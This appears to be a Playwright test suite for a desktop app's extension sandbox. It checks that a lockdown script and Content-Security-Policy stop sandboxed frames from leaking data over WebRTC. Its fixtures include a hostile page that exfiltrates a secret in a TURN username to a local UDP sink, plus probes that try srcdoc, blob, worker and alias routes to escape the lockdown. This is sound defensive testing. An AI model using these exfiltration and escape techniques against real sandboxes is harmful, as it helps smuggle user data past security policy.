/**
 * The WebRTC egress wall (M1-P3 round 3, blocker 1).
 *
 * Egress is a three-wall problem. `connect-src 'none'` closes fetch, WebSocket,
 * EventSource and `sendBeacon`. The wrapper's `frame-src` closes navigation.
 * Neither touches `RTCPeerConnection`, which reaches the network itself — Hermes
 * had a controlled TURN sink receive attacker-chosen data in the TURN
 * `username` with no fetch and no navigation.
 *
 * The sink here is a real UDP socket in the test process, so this observes
 * packets rather than intercepting them: `page.route` cannot see UDP.
 *
 * **Scope.** Chromium only. `webrtc 'block'` had *no effect* in this runtime —
 * the control and blocked runs delivered the same packets — which is why the
 * shipped wall does not rely on it alone. WebKitGTK/WebView2 confirmation is
 * Hermes's; the directive may well be honoured there, in which case it is the
 * primary wall and the realm lockdown is depth.
 */
import dgram from "node:dgram";

import { expect, test } from "@playwright/test";

import { installMockBridge } from "../helpers/bridge";

const HOST = "http://127.0.0.1:51234";
const SECRET = "CHANNEL_DATA_TURN_SECRET_4e7a";

/** Where the frame host serves its lockdown, and the tag it injects. */
const LOCKDOWN_PATH = `${HOST}/host/extension-lockdown.js`;
const LOCKDOWN_TAG = `<script src="${LOCKDOWN_PATH}"></script>`;
const LOCKDOWN_SOURCE = `(function(){try{
var gone=["RTCPeerConnection","webkitRTCPeerConnection","mozRTCPeerConnection","RTCDataChannel","webkitRTCDataChannel"];
for(var i=0;i<gone.length;i++){try{Object.defineProperty(window,gone[i],{value:undefined,writable:false,configurable:false});}catch(e){}}
}catch(e){}})();`;

function extensionCsp(withWebrtcDirective: boolean, allowInline = false) {
  return [
    "default-src 'none'",
    `script-src ${HOST}${allowInline ? " 'unsafe-inline'" : ""}`,
    "connect-src 'none'",
    ...(withWebrtcDirective ? ["webrtc 'block'"] : []),
    "base-uri 'none'",
    "form-action 'none'",
  ].join("; ");
}

async function turnSink() {
  const socket = dgram.createSocket("udp4");
  const packets: Buffer[] = [];
  socket.on("message", (message) => packets.push(message));
  await new Promise<void>((resolve) => socket.bind(0, "127.0.0.1", resolve));
  return {
    packets,
    port: (socket.address() as { port: number }).port,
    close: () => socket.close(),
  };
}

/** A page that tries to reach the TURN sink, carrying the secret. */
function hostileDocument(turnPort: number, lockdown: boolean) {
  return `<!doctype html>${lockdown ? LOCKDOWN_TAG : ""}<body><script>
    try {
      const pc = new RTCPeerConnection({ iceServers: [{
        urls: "turn:127.0.0.1:${turnPort}?transport=udp",
        username: ${JSON.stringify(SECRET)},
        credential: "x" }] });
      pc.createDataChannel("exfil");
      pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(() => {});
      parent.postMessage({ rtc: "constructed" }, "*");
    } catch (error) {
      parent.postMessage({ rtc: "threw:" + (error && error.name) }, "*");
    }
  </script>`;
}

async function runFrame(
  page: import("@playwright/test").Page,
  body: string,
  csp: string,
) {
  await page.route(`${HOST}/**`, async (route) => {
    if (route.request().url() === LOCKDOWN_PATH) {
      await route.fulfill({
        status: 200,
        contentType: "text/javascript; charset=utf-8",
        headers: { "Content-Security-Policy": csp },
        body: LOCKDOWN_SOURCE,
      });
      return;
    }
    await route.fulfill({
      status: 200,
      contentType: "text/html; charset=utf-8",
      headers: { "Content-Security-Policy": csp },
      body,
    });
  });
  page.on("console", (m) =>
    console.log("PAGE:", m.type(), m.text().slice(0, 160)),
  );
  await installMockBridge(page);
  await page.goto("/#/extensions");
  const outcome = await page.evaluate(
    (host) =>
      new Promise<string>((resolve) => {
        const timer = setTimeout(() => resolve("silent"), 4000);
        window.addEventListener("message", (event) => {
          const data = event.data as { rtc?: string };
          if (data?.rtc) {
            clearTimeout(timer);
            resolve(data.rtc);
          }
        });
        const frame = document.createElement("iframe");
        frame.setAttribute("sandbox", "allow-scripts");
        frame.src = `${host}/ext/demo/index.html`;
        document.body.append(frame);
      }),
    HOST,
  );
  // ICE gathering is asynchronous; give it room to actually emit.
  await page.waitForTimeout(3000);
  return outcome;
}

test("CONTROL: without the wall, WebRTC reaches an external sink", async ({
  page,
}) => {
  // Kept permanently. If this ever stops seeing packets, the harness has
  // stopped observing the vector and the blocked cases below prove nothing.
  const sink = await turnSink();
  const outcome = await runFrame(
    page,
    hostileDocument(sink.port, false),
    extensionCsp(false, true),
  );
  const packets = sink.packets.length;
  sink.close();

  expect(outcome).toBe("constructed");
  expect(packets).toBeGreaterThan(0);
});

test("CONTROL: the webrtc directive alone does not stop it in this runtime", async ({
  page,
}) => {
  // Documents *why* the shipped wall does not rely on `webrtc 'block'` alone.
  // If a future chromium honours it this test flips to zero and should be
  // re-read rather than deleted — that is a finding, not a failure.
  const sink = await turnSink();
  await runFrame(
    page,
    hostileDocument(sink.port, false),
    extensionCsp(true, true),
  );
  const packets = sink.packets.length;
  sink.close();

  expect(packets).toBeGreaterThan(0);
});

test("the realm lockdown stops WebRTC before a packet leaves", async ({
  page,
}) => {
  const sink = await turnSink();
  const outcome = await runFrame(
    page,
    hostileDocument(sink.port, true),
    extensionCsp(true, true),
  );
  const packets = sink.packets.length;
  sink.close();

  expect(outcome).toMatch(/^threw:/);
  expect(packets).toBe(0);
});

test("the extension realm cannot reach a fresh realm to undo the lockdown", async ({
  page,
}) => {
  // This is the argument the lockdown rests on, asserted rather than assumed.
  // Neutralising a global is theatre if the page can open a clean realm and read
  // a pristine constructor — and it WAS theatre in the first attempt: with
  // `'unsafe-inline'` allowed, a `srcdoc` child ran its own script and built a
  // peer connection from its own realm. `frame-src 'none'` does not stop a
  // `srcdoc` child; it inherits the policy instead. What closes it is inheriting
  // a policy with no inline script, which is what ships.
  //
  // The probe is therefore an EXTERNAL script, exactly as a real package must
  // now ship its code.
  const sink = await turnSink();
  const embed = (value: string) =>
    JSON.stringify(value).replace(/<\//g, "<\\/");
  const child = `<script>
    try {
      const pc = new RTCPeerConnection({ iceServers: [{
        urls: "turn:127.0.0.1:${sink.port}?transport=udp", username: "S", credential: "x" }] });
      pc.createDataChannel("x");
      pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(() => {});
      top.postMessage({ escaped: "nested-frame-ran" }, "*");
    } catch (e) { top.postMessage({ escaped: "nested-threw" }, "*"); }
  </script>`;

  const probeSource = `
    var report = {};
    report.top = typeof window.RTCPeerConnection;
    try { window.RTCPeerConnection = function () {}; } catch (e) {}
    report.afterReassign = typeof window.RTCPeerConnection;

    var a = document.createElement("iframe");
    a.srcdoc = ${embed(child)};
    document.body.appendChild(a);
    try {
      var b = document.createElement("iframe");
      b.src = URL.createObjectURL(new Blob([${embed(child)}], { type: "text/html" }));
      document.body.appendChild(b);
    } catch (e) {}

    try {
      var c = document.createElement("iframe");
      document.body.appendChild(c);
      report.sibling = typeof c.contentWindow.RTCPeerConnection;
    } catch (e) { report.sibling = "SecurityError"; }

    try { report.popup = window.open("about:blank") ? "opened" : "null"; }
    catch (e) { report.popup = "threw"; }

    try {
      var w = new Worker(URL.createObjectURL(new Blob([
        "postMessage(typeof RTCPeerConnection)"], { type: "text/javascript" })));
      w.onmessage = function (m) { report.worker = m.data; };
    } catch (e) { report.worker = "blocked"; }

    setTimeout(function () { parent.postMessage({ report: report }, "*"); }, 2500);
  `;

  const csp = extensionCsp(true);
  await page.route(`${HOST}/**`, async (route) => {
    const url = route.request().url();
    if (url === LOCKDOWN_PATH) {
      await route.fulfill({
        status: 200,
        contentType: "text/javascript; charset=utf-8",
        headers: { "Content-Security-Policy": csp },
        body: LOCKDOWN_SOURCE,
      });
      return;
    }
    if (url.endsWith("probe.js")) {
      await route.fulfill({
        status: 200,
        contentType: "text/javascript; charset=utf-8",
        headers: { "Content-Security-Policy": csp },
        body: probeSource,
      });
      return;
    }
    await route.fulfill({
      status: 200,
      contentType: "text/html; charset=utf-8",
      headers: { "Content-Security-Policy": csp },
      body: `<!doctype html>${LOCKDOWN_TAG}<body><script src="${HOST}/ext/demo/probe.js"></script>`,
    });
  });

  await installMockBridge(page);
  await page.goto("/#/extensions");

  const result = await page.evaluate(
    (host) =>
      new Promise<{ report: Record<string, string>; escapes: string[] }>(
        (resolve) => {
          const escapes: string[] = [];
          const timer = setTimeout(
            () => resolve({ report: {}, escapes }),
            8000,
          );
          window.addEventListener("message", (event) => {
            const data = event.data as {
              report?: Record<string, string>;
              escaped?: string;
            };
            if (data?.escaped) escapes.push(data.escaped);
            if (data?.report) {
              clearTimeout(timer);
              resolve({ report: data.report, escapes });
            }
          });
          const frame = document.createElement("iframe");
          frame.setAttribute("sandbox", "allow-scripts");
          frame.src = `${host}/ext/demo/index.html`;
          document.body.append(frame);
        },
      ),
    HOST,
  );
  await page.waitForTimeout(2000);
  const packets = sink.packets.length;
  sink.close();

  expect(result.report.top).toBe("undefined");
  expect(result.report.afterReassign).toBe("undefined");
  expect(result.report.sibling).toBe("SecurityError");
  expect(result.report.popup).toBe("null");
  // A worker realm exists but has no RTCPeerConnection to hand back.
  expect(result.report.worker ?? "undefined").not.toBe("function");
  // No nested frame ran a single line of script.
  expect(result.escapes).toEqual([]);
  expect(packets).toBe(0);
});

test("the wall is frame-scoped: Buzz's own WebRTC still works", async ({
  page,
}) => {
  // The whole reason the wall is frame-scoped rather than webview-scoped is
  // that Buzz's huddles use WebRTC in this same webview. An engine-level
  // disable would have closed the extension vector by breaking voice.
  await installMockBridge(page);
  await page.goto("/#/extensions");

  const host = await page.evaluate(() => {
    try {
      const pc = new RTCPeerConnection();
      const usable = typeof pc.createDataChannel === "function";
      pc.close();
      return { ctor: typeof RTCPeerConnection, usable };
    } catch {
      return { ctor: "threw", usable: false };
    }
  });

  // Buzz's own realm is untouched: constructor present and actually usable.
  expect(host.ctor).toBe("function");
  expect(host.usable).toBe(true);
});

test("no pristine realm via aliases, parents, or a pre-lockdown reference", async ({
  page,
}) => {
  // Hermes probes three recovery routes. Nested frames and workers are covered
  // above; this covers the third — a constructor alias reached through another
  // realm, or a reference captured before neutralisation.
  const sink = await turnSink();
  const csp = extensionCsp(true);

  const probeSource = `
    var report = {};
    report.own = typeof window.RTCPeerConnection;
    // A reference captured before the lockdown would defeat it — but the
    // lockdown is the document's first script, so extension code cannot run
    // earlier to capture one. Nothing here has a pre-neutralisation handle.
    report.selfAlias = typeof self.RTCPeerConnection;
    report.globalThisAlias = typeof globalThis.RTCPeerConnection;
    // Reaching out to another realm's constructor.
    try { report.parentAlias = typeof parent.RTCPeerConnection; }
    catch (e) { report.parentAlias = "SecurityError"; }
    try { report.topAlias = typeof top.RTCPeerConnection; }
    catch (e) { report.topAlias = "SecurityError"; }
    // Prototype / descriptor back-doors on the neutralised slot.
    try {
      var d = Object.getOwnPropertyDescriptor(window, "RTCPeerConnection");
      report.descriptor = d ? String(d.value) + ":" + d.configurable : "none";
    } catch (e) { report.descriptor = "threw"; }
    try {
      delete window.RTCPeerConnection;
      report.afterDelete = typeof window.RTCPeerConnection;
    } catch (e) { report.afterDelete = "threw"; }
    try {
      Object.defineProperty(window, "RTCPeerConnection", { value: function () {} });
      report.afterRedefine = typeof window.RTCPeerConnection;
    } catch (e) { report.afterRedefine = "threw"; }

    setTimeout(function () { parent.postMessage({ report: report }, "*"); }, 500);
  `;

  await page.route(`${HOST}/**`, async (route) => {
    const url = route.request().url();
    if (url === LOCKDOWN_PATH) {
      await route.fulfill({
        status: 200,
        contentType: "text/javascript; charset=utf-8",
        headers: { "Content-Security-Policy": csp },
        body: LOCKDOWN_SOURCE,
      });
      return;
    }
    if (url.endsWith("probe.js")) {
      await route.fulfill({
        status: 200,
        contentType: "text/javascript; charset=utf-8",
        headers: { "Content-Security-Policy": csp },
        body: probeSource,
      });
      return;
    }
    await route.fulfill({
      status: 200,
      contentType: "text/html; charset=utf-8",
      headers: { "Content-Security-Policy": csp },
      body: `<!doctype html>${LOCKDOWN_TAG}<body><script src="${HOST}/ext/demo/probe.js"></script>`,
    });
  });

  await installMockBridge(page);
  await page.goto("/#/extensions");

  const report = await page.evaluate(
    (host) =>
      new Promise<Record<string, string>>((resolve) => {
        const timer = setTimeout(() => resolve({}), 6000);
        window.addEventListener("message", (event) => {
          const data = event.data as { report?: Record<string, string> };
          if (data?.report) {
            clearTimeout(timer);
            resolve(data.report);
          }
        });
        const frame = document.createElement("iframe");
        frame.setAttribute("sandbox", "allow-scripts");
        frame.src = `${host}/ext/demo/index.html`;
        document.body.append(frame);
      }),
    HOST,
  );
  await page.waitForTimeout(1500);
  const packets = sink.packets.length;
  sink.close();

  expect(report.own).toBe("undefined");
  // `self` and `globalThis` are the same realm's global — same neutralised slot.
  expect(report.selfAlias).toBe("undefined");
  expect(report.globalThisAlias).toBe("undefined");
  // Other realms are opaque-origin and unreachable.
  expect(report.parentAlias).toBe("SecurityError");
  expect(report.topAlias).toBe("SecurityError");
  // The slot is non-configurable, so it cannot be deleted or redefined back.
  expect(report.descriptor).toBe("undefined:false");
  expect(report.afterDelete).toBe("undefined");
  expect(report.afterRedefine).toMatch(/undefined|threw/);
  expect(packets).toBe(0);
});

// ── Round 4: the nested-frame control Hermes specified ──────────────────────

/**
 * Drive the srcdoc-child probe under a given policy and report the whole chain.
 *
 * The point is that every link is *witnessed*, not inferred: the previous
 * version asserted an empty array, which is equally true when the child was
 * blocked and when the probe never appended it. Hermes hit the same shape from
 * the other side — his first harness ran `document.body.appendChild` while
 * `document.body` was null, so nothing executed and the silence looked like
 * safety.
 */
async function srcdocChain(
  page: import("@playwright/test").Page,
  options: { allowInline: boolean; turnPort: number },
) {
  const embed = (value: string) =>
    JSON.stringify(value).replace(/<\//g, "<\\/");
  const child = `<script>
    top.postMessage({ step: "child-ran", rtc: typeof RTCPeerConnection }, "*");
    try {
      const pc = new RTCPeerConnection({ iceServers: [{
        urls: "turn:127.0.0.1:${options.turnPort}?transport=udp",
        username: "S", credential: "x" }] });
      pc.createDataChannel("x");
      pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(() => {});
      top.postMessage({ step: "child-attempted" }, "*");
    } catch (e) { top.postMessage({ step: "child-threw" }, "*"); }
  </script>`;

  const probeSource = `
    top.postMessage({ step: "parent-ran" }, "*");
    var f = document.createElement("iframe");
    f.srcdoc = ${embed(child)};
    document.body.appendChild(f);
    top.postMessage({ step: "appended", connected: f.isConnected }, "*");
  `;

  const csp = extensionCsp(true, options.allowInline);
  await page.route(`${HOST}/**`, async (route) => {
    const url = route.request().url();
    if (url === LOCKDOWN_PATH) {
      await route.fulfill({
        status: 200,
        contentType: "text/javascript; charset=utf-8",
        headers: { "Content-Security-Policy": csp },
        body: LOCKDOWN_SOURCE,
      });
      return;
    }
    if (url.endsWith("probe.js")) {
      await route.fulfill({
        status: 200,
        contentType: "text/javascript; charset=utf-8",
        headers: { "Content-Security-Policy": csp },
        body: probeSource,
      });
      return;
    }
    await route.fulfill({
      status: 200,
      contentType: "text/html; charset=utf-8",
      headers: { "Content-Security-Policy": csp },
      // The host's prologue shape: its own doctype, then the lockdown, then
      // the package's bytes.
      body: `<!doctype html>${LOCKDOWN_TAG}<body><script src="${HOST}/ext/demo/probe.js"></script>`,
    });
  });

  await installMockBridge(page);
  await page.goto("/#/extensions");

  const steps = await page.evaluate(
    (host) =>
      new Promise<Array<Record<string, unknown>>>((resolve) => {
        const seen: Array<Record<string, unknown>> = [];
        const timer = setTimeout(() => resolve(seen), 5000);
        window.addEventListener("message", (event) => {
          const data = event.data as { step?: string };
          if (!data?.step) return;
          seen.push(data as Record<string, unknown>);
          if (data.step === "child-attempted" || data.step === "child-threw") {
            clearTimeout(timer);
            setTimeout(() => resolve(seen), 400);
          }
        });
        const frame = document.createElement("iframe");
        frame.setAttribute("sandbox", "allow-scripts");
        frame.src = `${host}/ext/demo/index.html`;
        document.body.append(frame);
      }),
    HOST,
  );
  await page.waitForTimeout(2500);
  return { steps, step: (name: string) => steps.find((s) => s.step === name) };
}

test("CONTROL: the srcdoc child really does run and reach the sink", async ({
  page,
}) => {
  // Permanent packet-positive control. Every link is witnessed: parent ran,
  // frame appended and connected, child ran with a real constructor, a
  // connection was attempted, and the sink saw packets. Without this, the
  // protected row below could pass because nothing happened at all.
  const sink = await turnSink();
  const chain = await srcdocChain(page, {
    allowInline: true,
    turnPort: sink.port,
  });
  const packets = sink.packets.length;
  sink.close();

  expect(chain.step("parent-ran")).toBeTruthy();
  expect(chain.step("appended")?.connected).toBe(true);
  expect(chain.step("child-ran")).toBeTruthy();
  expect(chain.step("child-ran")?.rtc).toBe("function");
  expect(chain.step("child-attempted")).toBeTruthy();
  expect(packets).toBeGreaterThan(0);
});

test("PROTECTED: the same chain stops at the child under the shipped policy", async ({
  page,
}) => {
  // Only the policy changes from the control — same probe, same fixture. The
  // parent must still run and still append the frame, so a regression that
  // breaks the probe fails here as a missing witness rather than passing as
  // silence.
  const sink = await turnSink();
  const chain = await srcdocChain(page, {
    allowInline: false,
    turnPort: sink.port,
  });
  const packets = sink.packets.length;
  sink.close();

  expect(chain.step("parent-ran")).toBeTruthy();
  expect(chain.step("appended")?.connected).toBe(true);
  // The child never executes, so there is no fresh realm to recover from.
  expect(chain.step("child-ran")).toBeUndefined();
  expect(chain.step("child-attempted")).toBeUndefined();
  expect(packets).toBe(0);
});
